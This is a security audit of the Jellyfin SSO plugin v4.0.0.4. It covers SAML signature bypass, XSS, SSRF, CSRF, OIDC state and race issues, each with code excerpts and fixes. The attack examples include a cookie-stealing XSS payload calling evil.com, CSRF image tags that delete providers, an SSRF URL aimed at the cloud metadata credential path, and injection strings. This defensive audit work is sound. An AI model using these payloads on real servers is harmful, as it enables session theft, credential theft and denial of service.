# Security Findings: Jellyfin SSO Plugin v4.0.0.4

**Initial Assessment Date:** 2026-04-15
**Reassessment Date:** 2026-04-15
**Scope:** Full source-level review of `SSO-Auth/` directory (C# backend + JS frontend)
**Methodology:** Line-by-line manual code audit based on the data flow analysis in `security_arch.md`

---

## Finding Index

| ID | Title | Severity | CVSS 3.1 Est. | Status |
|----|-------|----------|---------------|--------|
| SSO-01 | SAML Authentication Bypass -- Signature Never Verified | Critical | 9.8 | **FIXED** |
| SSO-02 | SAML Assertion Tampering via Client Round-Trip | Low | 3.0 | **Mitigated** |
| SSO-03 | Reflected XSS via JavaScript String Injection in WebResponse | High | 8.1 | Open |
| SSO-04 | Server-Side Request Forgery via Avatar URL | High | 7.5 | Open |
| SSO-05 | Stored XSS via innerHTML in Linking Page | High | 7.3 | Open |
| SSO-06 | Stored XSS via innerHTML in Admin Config Page | High | 7.3 | Open |
| SSO-07 | CSRF on Provider Deletion (GET Endpoints) | High | 6.5 | Open |
| SSO-08 | OIDC State Brute-Force / Replay (No Binding to Client) | Medium | 6.8 | Open |
| SSO-09 | Race Condition in Static StateManager Dictionary | Medium | 5.9 | Open |
| SSO-10 | Unhandled Exception Leaks Stack Trace on Invalid OIDC State | Medium | 5.3 | **FIXED** |
| SSO-11 | Sensitive Secrets Returned in Admin API Responses | Medium | 4.9 | Open |
| SSO-12 | Avatar File Extension Derived from Untrusted Content-Type | Medium | 4.7 | Open |
| SSO-13 | Unregister Endpoint Does Not Persist Changes | Medium | 4.3 | Open |
| SSO-14 | No SAML Audience or Recipient Validation | Medium | 6.1 | Open |
| SSO-15 | Log Injection via SAML relayState Parameter | Low | 3.7 | Open |
| SSO-16 | OIDC Error Details Reflected to Client | Low | 3.5 | Open |
| SSO-17 | No Rate Limiting on Authentication Endpoints | Low | 3.1 | Open |
| SSO-18 | Provider Name Enumeration Without Authentication | Low | 2.6 | Open |
| SSO-19 | XPath Injection Risk in Public SAML Methods | Info | N/A | Open |
| SSO-20 | Missing HttpClient Best Practices | Info | N/A | **Partially Fixed** |

---

## SSO-01: SAML Authentication Bypass -- Signature Never Verified

**Severity:** Critical
**CWE:** CWE-347 (Improper Verification of Cryptographic Signature)
**CVSS 3.1:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
**Status:** FIXED in v4.0.0.4

### Description

The SAML `Response` class (Saml.cs) implements an `IsValid()` method at line 99 that verifies the XML digital signature, validates the signature reference scope, and checks assertion expiration. In v4.0.0.3, **this method was never called anywhere in the entire codebase**.

### Fix Applied

In v4.0.0.4, `IsValid()` is now called in all three code paths before any claims are extracted:

1. **SSOController.cs:581** (`SamlPost`) -- Validates the IdP's form-posted `SAMLResponse`:
   ```csharp
   var samlResponse = new Response(config.SamlCertificate, Request.Form["SAMLResponse"]);
   if (!samlResponse.IsValid())
   {
       return Problem("Invalid SAML signature");
   }
   ```

2. **SSOController.cs:745** (`SamlAuth`) -- Validates client-supplied SAML data:
   ```csharp
   var samlResponse = new Response(config.SamlCertificate, response.Data);
   if (!samlResponse.IsValid())
   {
       return Problem("Invalid SAML signature");
   }
   ```

3. **SSOController.cs:1089** (`SamlLink`) -- Validates client-supplied SAML data for account linking:
   ```csharp
   var samlResponse = new Response(config.SamlCertificate, response.Data);
   if (!samlResponse.IsValid())
   {
       return Problem("Invalid SAML signature");
   }
   ```

### Verification

Forged SAML assertions without a valid signature from the configured IdP certificate will now be rejected at all entry points. The original proof of concept no longer works.

---

## SSO-02: SAML Assertion Tampering via Client Round-Trip

**Severity:** Low (downgraded from Critical in v4.0.0.3)
**CWE:** CWE-602 (Client-Side Enforcement of Server-Side Security)
**Status:** Mitigated in v4.0.0.4

### Description

The SAML authentication flow still sends the full SAML assertion XML to the user's browser, then relies on the browser to POST it back unmodified.

**Flow (unchanged):**

1. IdP POSTs `SAMLResponse` to `SamlPost` (SSOController.cs:560)
2. `SamlPost` re-encodes the parsed XML as Base64 and embeds it into an HTML page:
   ```csharp
   // SSOController.cs:610
   data: Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(samlResponse.Xml))
   ```
3. The generated JavaScript (WebResponse.cs:466) sends this data back:
   ```javascript
   var data = '<base64 SAML XML>';
   // ...
   xhr.send(JSON.stringify(request)); // data field = the SAML XML
   ```
4. `SamlAuth` (SSOController.cs:743) re-parses the assertion from this client POST

Between steps 2 and 4, the client has full control over the SAML data.

### Mitigation Applied

With the SSO-01 fix, `IsValid()` is now called in **both** `SamlPost` (line 581) **and** `SamlAuth` (line 745). If the assertion is modified in transit by the client, the signature verification in `SamlAuth` will fail, rejecting the tampered data.

### Residual Risk

The architectural concern remains: round-tripping signed security data through an untrusted client is poor practice. An attacker who obtains a valid, signed SAML assertion (e.g., by intercepting a legitimate login on a non-HTTPS deployment) could replay it. However, this is a standard SAML replay concern and is partially mitigated by the assertion expiration check in `IsExpired()`.

### Remaining Remediation

The ideal fix is still to avoid round-tripping the assertion:

1. In `SamlPost`, validate the assertion, extract claims server-side, and store them in a server-side session/state (similar to the OIDC `StateManager` pattern)
2. Return only an opaque token/state ID to the client
3. In `SamlAuth`, look up the server-side state by token -- never re-parse client-supplied SAML XML

---

## SSO-03: Reflected XSS via JavaScript String Injection in WebResponse

**Severity:** High
**CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)
**Status:** Open

### Description

`WebResponse.Generator()` (WebResponse.cs:416-514) constructs an HTML page by concatenating server-side values directly into JavaScript string literals with no escaping. Several interpolation points exist:

**Line 466** -- `data` parameter:
```csharp
var data = '" + data + @"';
```

**Line 482** -- `provider` parameter:
```csharp
var url = '" + punycodeBaseUrl + "/sso/" + mode + "/Auth/" + provider + @"';
```

**Line 439** -- `provider` in link URL:
```csharp
const url = '" + $"{punycodeBaseUrl}/sso/{mode}/Link/{provider}/" + @"' + jfUser;
```

**Line 464** -- `punycodeBaseUrl` in iframe src:
```csharp
document.getElementById('iframe-main').src = '" + punycodeBaseUrl + @"/web/index.html';
```

### Attack Vector

The `provider` parameter is a URL route segment. While provider names are typically set by admins, the value flows directly from the request URL into the generated page. An attacker with admin access (or who had exploited the now-fixed SSO-01) could create a provider with a name like:

```
';alert(document.cookie);//
```

When any user initiates SSO via `GET /sso/OID/start/';alert(document.cookie);//`, the generated JavaScript becomes:

```javascript
var url = 'https://target/sso/OID/Auth/';alert(document.cookie);//';
```

For SAML, the `data` parameter is Base64-encoded XML, which constrains it to the Base64 alphabet (no `'`). For OIDC, `data` is the OIDC state string from the library, which is also typically safe. The primary injectable sink is `provider`.

The `punycodeBaseUrl` is partially protected by `IdnMapping.GetAscii()` which rejects most special characters, but `Request.PathBase` (used in `GetRequestBase` at line 1283) could contain attacker-influenced values depending on reverse proxy configuration.

### Impact

JavaScript execution in the origin of the Jellyfin server. An attacker can steal session tokens from `localStorage`, perform actions as the victim user (including admin operations), or redirect the user to a phishing page.

### Remediation

Escape all interpolated values for the JavaScript string context. At minimum, replace `\` with `\\`, `'` with `\'`, and newline characters. Preferably, embed values as JSON in a `<script type="application/json">` block and parse with `JSON.parse()` in the script:

```csharp
var safeData = JsonConvert.SerializeObject(new { data, provider, baseUrl = punycodeBaseUrl, mode, isLinking });
// Embed as: <script id="sso-config" type="application/json">{safeData}</script>
// Read as: const config = JSON.parse(document.getElementById('sso-config').textContent);
```

---

## SSO-04: Server-Side Request Forgery via Avatar URL

**Severity:** High
**CWE:** CWE-918 (Server-Side Request Forgery)
**Status:** Open

### Description

When `AvatarUrlFormat` is configured on an OIDC provider, the server constructs a URL by substituting OIDC claim values into the format string and makes an HTTP request to the resulting URL:

**SSOController.cs:172-174** (URL construction from claims):
```csharp
StateManager[state].AvatarURL = result.User.Claims.Aggregate(
    config.AvatarUrlFormat,
    (s, claim) => s.Contains($"@{{{claim.Type}}}") ? s.Replace($"@{{{claim.Type}}}", claim.Value) : s);
```

**SSOController.cs:1209** (HTTP request):
```csharp
var avatarResponse = await client.GetAsync(avatarUrl);
```

The claim values originate from the OIDC Identity Provider. If the IdP is compromised, allows user-editable profile fields that map to claims, or if the format string uses a claim type that users can influence, the resulting URL is attacker-controlled.

**Partial improvement in v4.0.0.4:** The `HttpClient` is now created via `IHttpClientFactory` (line 1202) instead of `new HttpClient()`, resolving socket exhaustion (see SSO-20). However, the core SSRF vulnerability remains.

### Exploitation Scenarios

1. **Cloud metadata theft:** Claim value set to `http://169.254.169.254/latest/meta-data/iam/security-credentials/` -- the server fetches cloud provider credentials.

2. **Internal service scanning:** Claim values targeting `http://10.0.0.X:PORT/` to probe internal network services, with the content-type check distinguishing live hosts from dead ones based on response behavior.

3. **Data exfiltration:** If `AvatarUrlFormat` is `https://attacker.com/@{sub}` and a `sub` claim contains sensitive data, it leaks to the attacker's server.

### Additional Weaknesses in the Avatar Flow

**Content-type validation is trivially bypassable** (SSOController.cs:1217):
```csharp
if (!contentType.StartsWith("image"))
```
A server responding with `Content-Type: image/anything` passes the check. The subtype is then used as a file extension (line 1222):
```csharp
var extension = contentType.Split("/").Last();
```

**No response size limit:** The entire response body is read into memory (line 1223), enabling memory exhaustion.

**No timeout:** The `HttpClient` created via `IHttpClientFactory` uses default timeout settings. A slow-drip server could hold the connection for the default 100-second timeout.

**No redirect limit:** `HttpClient` follows redirects by default, which can be used to chain SSRF through intermediate redirectors.

### Remediation

1. Validate the constructed URL against an allowlist of domains before making the request
2. Configure the named `HttpClient` via `IHttpClientFactory` with explicit timeouts, redirect limits, and maximum response size
3. Block requests to private IP ranges (RFC 1918, link-local, loopback)
4. Sanitize the file extension to only allow known image extensions (png, jpg, gif, webp)

---

## SSO-05: Stored XSS via innerHTML in Linking Page

**Severity:** High
**CWE:** CWE-79 (Cross-Site Scripting -- Stored)
**Status:** Open

### Description

The account linking page (linking.js) renders data from API responses using `innerHTML` without sanitization:

**linking.js:38-42** -- Provider name rendered as HTML:
```javascript
provider_config.innerHTML = `
  <label class="inputLabel inputLabelUnfocused sso-provider-link-title"
  >${provider_name}
  </label>
  ...
```

**linking.js:112-123** -- Canonical name (SSO identity) rendered as HTML:
```javascript
out.innerHTML = `
  <input is="emby-checkbox" class="sso-link-checkbox"
    data-id="${canonical_name}" ...type="checkbox" />
  <span class="checkbox-label">${canonical_name}</span>
`;
```

The `canonical_name` value comes from the OIDC `preferred_username` or SAML `NameID` claim. These values are set by the Identity Provider and stored in the plugin configuration's `CanonicalLinks` dictionary.

### Attack Vector

1. An attacker registers at the IdP with a username containing malicious HTML, e.g.:
   ```
   <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
   ```
2. The attacker completes SSO login. The plugin stores this as the `CanonicalLinks` key.
3. When any user (including admins) visits the linking page, the malicious username is rendered via `innerHTML`, executing the JavaScript.

Additionally, `canonical_name` is inserted into an unquoted `data-id` attribute:
```javascript
data-id="${canonical_name}"
```
An attacker with a canonical name like `x" onmouseover="alert(1)" data-x="` can inject event handlers.

### Impact

Arbitrary JavaScript execution in the context of any user (including administrators) who views the linking page. Can steal session tokens, modify server configuration, or create additional admin accounts.

### Remediation

Replace `innerHTML` with DOM APIs that set `textContent` for display values:

```javascript
const label = document.createElement('span');
label.classList.add('checkbox-label');
label.textContent = canonical_name; // Safe: no HTML parsing
```

For `data-id` attributes, use `setAttribute()`:
```javascript
input.setAttribute('data-id', canonical_name);
```

---

## SSO-06: Stored XSS via innerHTML in Admin Config Page

**Severity:** High
**CWE:** CWE-79 (Cross-Site Scripting -- Stored)
**Status:** Open

### Description

The admin configuration page (config.js:60-78) renders Jellyfin library folder names using `innerHTML`:

```javascript
out.innerHTML = `
  <input is="emby-checkbox" class="folder-checkbox chkFolder"
    data-id="${folder.Id}" type="checkbox" />
  <span>${folder.Name}</span>
`;
```

`folder.Name` comes from Jellyfin's `Library/MediaFolders` API. While folder names are typically set by administrators, if an attacker gains limited admin access, they could rename a library to include malicious HTML that would execute when other admins visit the SSO config page.

Additionally, the folder role mapping (config.js:86-137) renders role names via `innerHTML` in the same pattern.

### Impact

XSS in the admin configuration page. Lower severity than SSO-05 because it requires prior admin access to plant the payload, but could be chained with other vulnerabilities for persistence.

### Remediation

Same as SSO-05: use `textContent` instead of `innerHTML` for rendering user-controlled strings.

---

## SSO-07: CSRF on Provider Deletion (GET Endpoints)

**Severity:** High
**CWE:** CWE-352 (Cross-Site Request Forgery)
**Status:** Open

### Description

Provider deletion endpoints use HTTP GET:

```csharp
// SSOController.cs:448-449
[Authorize(Policy = Policies.RequiresElevation)]
[HttpGet("OID/Del/{provider}")]
public void OidDel(string provider)

// SSOController.cs:696-697
[Authorize(Policy = Policies.RequiresElevation)]
[HttpGet("SAML/Del/{provider}")]
public OkResult SamlDel(string provider)
```

GET requests are not protected against CSRF because:
- Browsers send cookies automatically with GET requests (no preflight)
- GET requests can be triggered by `<img>`, `<script>`, `<link>`, or `<iframe>` tags
- Standard CSRF token mechanisms only protect POST requests

### Attack Vector

An attacker sends an admin a page or email containing:

```html
<img src="https://jellyfin-target/sso/OID/Del/MyProvider" style="display:none">
<img src="https://jellyfin-target/sso/SAML/Del/MySamlProvider" style="display:none">
```

If the admin has an active Jellyfin session, their browser silently requests these URLs, deleting the SSO providers and locking out all SSO users.

### Impact

An attacker can delete all SSO provider configurations, causing a denial of service for all SSO-dependent users. Combined with SSO-18 (provider name enumeration), the attacker can target specific providers.

### Remediation

1. Change deletion endpoints to use HTTP DELETE or POST methods
2. Require CSRF tokens or the `X-Emby-Authorization` header to verify intent

---

## SSO-08: OIDC State Brute-Force / Replay (No Binding to Client)

**Severity:** Medium
**CWE:** CWE-384 (Session Fixation), CWE-330 (Insufficient Randomness check needed)
**Status:** Open

### Description

The OIDC authentication completion endpoint (`OidAuth`, SSOController.cs:508-547) accepts any client that can present a valid state value:

```csharp
foreach (var kvp in StateManager)
{
    if (kvp.Value.State.State.Equals(response.Data) && kvp.Value.Valid)
    {
        // Issues session -- no verification that THIS client initiated the flow
    }
}
```

There is **no binding** between the OIDC state and the client that initiated the flow. The state value is the only secret, and:

1. **No IP binding:** Any IP address can complete the flow
2. **No session binding:** No cookie or token ties the state to the initiator
3. **Linear scan:** The code iterates all states, checking each one against the provided value
4. **State values exposed:** The `OidStates` debug endpoint (admin-only, line 493) dumps all active states

### Impact

If an attacker can obtain a valid state value (e.g., via the admin `OidStates` endpoint, network sniffing on a non-HTTPS deployment, or log files), they can complete the OIDC flow and gain the session of whatever user authenticated with the IdP.

The state value's entropy depends on the Duende OIDC library's implementation, which likely uses sufficient randomness, making blind brute-force impractical. But the lack of client binding means any state leak is directly exploitable.

### Remediation

Bind the OIDC state to the client, for example by:
1. Setting a secure cookie when the challenge is initiated (in `OidChallenge`)
2. Requiring that cookie to be present when completing auth (in `OidAuth`)
3. Removing the `OidStates` debug endpoint, or at minimum redacting state values

---

## SSO-09: Race Condition in Static StateManager Dictionary

**Severity:** Medium
**CWE:** CWE-362 (Concurrent Execution Using Shared Resource with Improper Synchronization)
**Status:** Open

### Description

`StateManager` is a static `Dictionary<string, TimedAuthorizeState>`:

```csharp
// SSOController.cs:51
private static readonly IDictionary<string, TimedAuthorizeState> StateManager = new Dictionary<string, TimedAuthorizeState>();
```

This dictionary is shared across all concurrent request threads with no synchronization. Multiple operations modify it concurrently:

- `OidChallenge` adds entries (line 420)
- `OidPost` reads and updates entries (lines 118, 150-312)
- `OidAuth` iterates entries (line 522)
- `Invalidate()` iterates AND removes entries simultaneously (lines 1271-1281):

```csharp
foreach (var kvp in StateManager) // Iterating
{
    var now = DateTime.Now;
    if (now.Subtract(kvp.Value.Created).TotalMinutes > 1)
    {
        StateManager.Remove(kvp.Key); // Modifying during iteration
    }
}
```

### Impact

- `InvalidOperationException` from concurrent modification during enumeration -- causes 500 errors
- Lost entries if two threads add/remove simultaneously -- causes auth failures
- Potential state confusion if entries are corrupted -- could allow one user's state to be matched to another's request

### Remediation

Replace `Dictionary` with `ConcurrentDictionary<string, TimedAuthorizeState>` and rewrite `Invalidate()` to avoid modifying during enumeration:

```csharp
private static readonly ConcurrentDictionary<string, TimedAuthorizeState> StateManager = new();

private void Invalidate()
{
    var now = DateTime.UtcNow;
    var expiredKeys = StateManager.Where(kvp => now.Subtract(kvp.Value.Created).TotalMinutes > 1)
                                   .Select(kvp => kvp.Key).ToList();
    foreach (var key in expiredKeys)
    {
        StateManager.TryRemove(key, out _);
    }
}
```

---

## SSO-10: Unhandled Exception Leaks Stack Trace on Invalid OIDC State

**Severity:** Medium
**CWE:** CWE-209 (Generation of Error Message Containing Sensitive Information)
**CVSS 3.1:** 5.3
**Status:** FIXED in v4.0.0.4

### Description

In v4.0.0.3, `OidPost` (SSOController.cs) used direct dictionary indexing:

```csharp
var currentState = StateManager[state].State;
```

If `state` was missing from `StateManager`, this threw an unhandled `KeyNotFoundException`, returning a 500 response with a full stack trace.

### Fix Applied

In v4.0.0.4, `OidPost` (SSOController.cs:118-121) now uses `TryGetValue`:

```csharp
if (!StateManager.TryGetValue(state, out var timedState))
{
    return BadRequest("Invalid or expired state");
}
var currentState = timedState.State;
```

Additionally, a null/empty check was added for the state parameter at line 113-116:
```csharp
if (string.IsNullOrEmpty(state))
{
    return BadRequest("Missing state");
}
```

### Verification

Invalid or expired state values now return a clean 400 error with no stack trace or implementation details.

---

## SSO-11: Sensitive Secrets Returned in Admin API Responses

**Severity:** Medium
**CWE:** CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)
**Status:** Open

### Description

**`OidProviders`** (SSOController.cs:463-466) returns the full `OidConfig` object which includes:
- `OidSecret` -- The OIDC client secret
- `OidClientId` -- The OIDC client ID
- `CanonicalLinks` -- All user identity mappings

**`SamlProviders`** (SSOController.cs:712-715) returns the full `SamlConfig` which includes:
- `SamlCertificate` -- The SAML certificate (Base64-encoded)

**`OidStates`** (SSOController.cs:493-497) returns:
- All in-flight OIDC authorization states, potentially including tokens and state secrets

While these endpoints require admin authentication, exposing secrets in API responses:
1. Increases the blast radius if admin credentials are compromised
2. Secrets may be logged by middleware, proxies, or monitoring tools
3. Client-side code may inadvertently cache or expose them

### Remediation

Redact sensitive fields before returning configurations. Return `"***"` or `null` for `OidSecret`, `SamlCertificate`, and state internals. Remove or restrict the `OidStates` debug endpoint.

---

## SSO-12: Avatar File Extension Derived from Untrusted Content-Type

**Severity:** Medium
**CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type)
**Status:** Open

### Description

In `Authenticate()` (SSOController.cs:1216-1238):

```csharp
var contentType = contentTypeList.First();
if (!contentType.StartsWith("image"))  // Line 1217: weak validation
{
    throw new Exception("Content type of avatar URL is not an image");
}
var extension = contentType.Split("/").Last();  // Line 1222: extension from Content-Type
// ...
user.ProfileImage = new ImageInfo(Path.Combine(userDataPath, "profile" + extension));  // Line 1236
await _providerManager.SaveImage(stream, contentType, user.ProfileImage.Path);  // Line 1238
```

The file extension is derived from the Content-Type header's subtype. A malicious avatar server could return:

- `Content-Type: image/svg+xml` -- SVG files can contain JavaScript (`<script>` tags) that executes when the image is viewed in a browser. If Jellyfin serves user profile images, this becomes stored XSS.
- `Content-Type: image/x-php` -- While unlikely to be executed by Jellyfin, it could be dangerous if the file system is shared with a web server.
- The extension is not sanitized for path separators. On Windows, `Content-Type: image/..\..\..\..\webroot\shell` could potentially write outside the intended directory, though `Path.Combine` provides some protection.

### Remediation

1. Allowlist extensions: only accept `png`, `jpg`, `jpeg`, `gif`, `webp`
2. Do not derive the extension from the Content-Type; use content sniffing (magic bytes) instead
3. Generate a fixed filename like `profile.jpg` regardless of source

---

## SSO-13: Unregister Endpoint Does Not Persist Changes

**Severity:** Medium
**CWE:** CWE-841 (Improper Enforcement of Behavioral Workflow)
**Status:** Open

### Description

The `Unregister` endpoint (SSOController.cs:841-847):

```csharp
[Authorize(Policy = Policies.RequiresElevation)]
[HttpPost("Unregister/{username}")]
public ActionResult Unregister(string username, [FromBody] string provider)
{
    User user = _userManager.GetUserByName(username);
    user.AuthenticationProviderId = provider;
    return Ok();  // Returns success but never calls UpdateUserAsync()
}
```

The user's `AuthenticationProviderId` is modified in memory but never persisted to the database because `_userManager.UpdateUserAsync(user)` is never called. The endpoint returns `200 OK`, misleading the admin into believing the operation succeeded.

### Security Impact

An administrator attempting to remove a user from SSO authentication (e.g., during incident response to revoke SSO access) will believe the action succeeded when it actually had no effect. The user retains SSO access until the server restarts (in-memory change lost).

### Remediation

Add `await _userManager.UpdateUserAsync(user).ConfigureAwait(false);` before returning. Also add null-checking for the user lookup:

```csharp
User user = _userManager.GetUserByName(username);
if (user == null) return NotFound("User not found");
user.AuthenticationProviderId = provider;
await _userManager.UpdateUserAsync(user).ConfigureAwait(false);
return Ok();
```

---

## SSO-14: No SAML Audience or Recipient Validation

**Severity:** Medium
**CWE:** CWE-287 (Improper Authentication)
**Status:** Open

### Description

Even though the SAML signature is now verified (SSO-01 fixed), the SAML `Response` class (Saml.cs) does not validate:

1. **Audience Restriction** -- The assertion's `<AudienceRestriction>` should match this Jellyfin instance's SAML client ID. Without this check, a valid SAML assertion from the same IdP but intended for a *different* service provider could be replayed against Jellyfin.

2. **Recipient** -- The `<SubjectConfirmationData Recipient="...">` should match the ACS URL. Without this, assertions intended for other relying parties are accepted.

3. **InResponseTo** -- The response should reference the ID from the original `AuthnRequest`. Without this, any valid assertion can be used regardless of whether Jellyfin initiated the request.

4. **NotBefore** -- While `IsExpired()` checks `NotOnOrAfter`, there is no check for `NotBefore` / `Conditions@NotBefore`.

### Impact

Cross-service assertion replay: A valid SAML assertion from the same IdP, intended for a different application, could be used to authenticate to Jellyfin.

### Remediation

Add validation for Audience, Recipient, InResponseTo, and NotBefore conditions in the `IsValid()` method or a new `Validate(expectedAudience, expectedRecipient)` method.

---

## SSO-15: Log Injection via SAML relayState Parameter

**Severity:** Low
**CWE:** CWE-117 (Improper Output Neutralization for Logs)
**Status:** Open

### Description

In `SamlPost` (SSOController.cs:574-575):

```csharp
_logger.LogInformation(
    $"SAML request has relayState of {relayState}");
```

The `relayState` query parameter is a user-controlled string interpolated directly into a log message using C# string interpolation (`$"...{relayState}"`), bypassing Serilog's structured logging sanitization. An attacker can inject newlines or log format characters to forge log entries or corrupt log parsing.

Note: Other log statements in the file use structured logging correctly (e.g., line 341: `"OpenID user {Username} has..."`), making this inconsistent use of string interpolation more likely an oversight.

### Remediation

Use structured logging parameters:
```csharp
_logger.LogInformation("SAML request has relayState of {RelayState}", relayState);
```

---

## SSO-16: OIDC Error Details Reflected to Client

**Severity:** Low
**CWE:** CWE-209 (Information Exposure Through an Error Message)
**Status:** Open

### Description

In `OidPost` (SSOController.cs:155):

```csharp
return ReturnError(StatusCodes.Status400BadRequest,
    $"Error logging in: {result.Error} - {result.ErrorDescription}");
```

And in `OidChallenge` (SSOController.cs:417):

```csharp
return ReturnError(StatusCodes.Status400BadRequest,
    $"Error preparing login: {state.Error} - {state.ErrorDescription}");
```

Error details from the OIDC library are returned directly to the client. These may contain internal endpoint URLs, configuration details, or token-related information that aids an attacker in understanding the system's OIDC setup.

### Remediation

Log the full error details server-side and return a generic error message to the client:
```csharp
_logger.LogError("OIDC login error: {Error} - {Description}", result.Error, result.ErrorDescription);
return ReturnError(StatusCodes.Status400BadRequest, "Authentication failed. Please try again.");
```

---

## SSO-17: No Rate Limiting on Authentication Endpoints

**Severity:** Low
**CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)
**Status:** Open

### Description

The authentication completion endpoints (`OidAuth`, `SamlAuth`) have no rate limiting. The lack of rate limiting enables:

- Brute-force attempts against OIDC state values
- Denial of service through resource exhaustion (each SAML auth parses XML and verifies signatures, each OIDC auth iterates all states)
- Automated account creation via rapid SAML assertion submission (requires valid signed assertions since SSO-01 is fixed)

### Remediation

Implement rate limiting via ASP.NET Core middleware or Jellyfin's built-in rate limiting, particularly on:
- `/sso/OID/Auth/{provider}`
- `/sso/SAML/Auth/{provider}`
- `/sso/OID/start/{provider}` (to prevent state exhaustion)

---

## SSO-18: Provider Name Enumeration Without Authentication

**Severity:** Low
**CWE:** CWE-200 (Information Exposure)
**Status:** Open

### Description

The endpoints `GET /sso/OID/GetNames` (SSOController.cs:472-476) and `GET /sso/SAML/GetNames` (SSOController.cs:482-486) require no authentication and return the names of all configured SSO providers.

### Impact

Allows reconnaissance: an attacker learns which SSO providers are configured, which aids in:
- Targeting specific provider deletion via SSO-07 (CSRF)
- Social engineering by referencing the exact provider names

### Remediation

These endpoints are likely needed for the login UI to display SSO buttons. If so, the risk is accepted. If not needed publicly, add `[Authorize]`.

---

## SSO-19: XPath Injection Risk in Public SAML Methods

**Severity:** Informational
**CWE:** CWE-643 (Improper Neutralization of Data within XPath Expressions)
**Status:** Open

### Description

`GetCustomAttribute` and `GetCustomAttributes` in Saml.cs (lines 265, 276) build XPath queries via string concatenation:

```csharp
"/samlp:Response/saml:Assertion[1]/saml:AttributeStatement/saml:Attribute[@Name='" + attr + "']/saml:AttributeValue"
```

In the current code, `attr` is always a hardcoded string (`"Role"`), so this is not exploitable. However, these methods are `public` and take a `string` parameter. If future code passes user-controlled values, XPath injection becomes possible, allowing an attacker to extract arbitrary data from the SAML XML.

### Remediation

Document that `attr` must not contain user-controlled input, or parameterize the XPath query.

---

## SSO-20: Missing HttpClient Best Practices

**Severity:** Informational
**CWE:** CWE-400 (Uncontrolled Resource Consumption)
**Status:** Partially Fixed in v4.0.0.4

### Description

In v4.0.0.3, `Authenticate()` created a new `HttpClient` per request:
```csharp
using var client = new HttpClient();
```

### Fix Applied

In v4.0.0.4, the controller now injects `IHttpClientFactory` (SSOController.cs:50) and uses it to create clients (SSOController.cs:1202):
```csharp
using var client = _httpClientFactory.CreateClient();
```

This resolves the socket exhaustion risk from per-request `HttpClient` creation.

### Remaining Issues

1. **No timeout:** The client uses default timeout settings (100 seconds). A malicious server can hold connections.
2. **No response size limit:** `ReadAsStreamAsync()` reads the entire response. A multi-GB response causes memory exhaustion.
3. **Follows redirects by default:** An SSRF filter on the initial URL can be bypassed by a 302 redirect to an internal IP.

### Remaining Remediation

Configure a named `HttpClient` via `IHttpClientFactory` with:
- Explicit timeout (e.g., 10 seconds)
- Maximum response size
- Disabled automatic redirects (validate each hop manually)

---

## Positive Security Observations

The following security-positive patterns were noted:

1. **XXE Prevention:** `XmlResolver = null` is set in Saml.cs:80 before parsing XML, preventing XML External Entity attacks.
2. **Cryptographic Randomness:** New user passwords use `RandomNumberGenerator.GetBytes(64)` (SSOController.cs:904), which is cryptographically secure.
3. **SAML Signature Reference Validation:** `ValidateSignatureReference()` in Saml.cs:117-143 checks that the signature covers the correct element (root or assertion), preventing XML signature wrapping attacks. This is now effective since `IsValid()` is called in all SAML code paths (SSO-01 fix).
4. **SAML Signature Verification:** `IsValid()` is now called before any claims are extracted in `SamlPost`, `SamlAuth`, and `SamlLink` (SSO-01 fix).
5. **Authorization Helpers:** `RequestHelpers.AssertCanUpdateUser()` correctly checks both user identity and admin status for self-service endpoints.
6. **Scheme Override Validation:** `GetRequestBase()` at SSOController.cs:1301 only accepts "http" or "https" for scheme overrides, preventing javascript: or other dangerous scheme injection.
7. **SAML Expiration Check:** `IsExpired()` in Saml.cs:145-155 correctly checks `NotOnOrAfter`, and is now effective since `IsValid()` is called.
8. **HttpClient via Factory:** Avatar fetching now uses `IHttpClientFactory` (SSOController.cs:1202), preventing socket exhaustion under load.
9. **State Validation:** OIDC state lookup now uses `TryGetValue` (SSOController.cs:118) with proper null/empty checks, preventing unhandled exceptions.
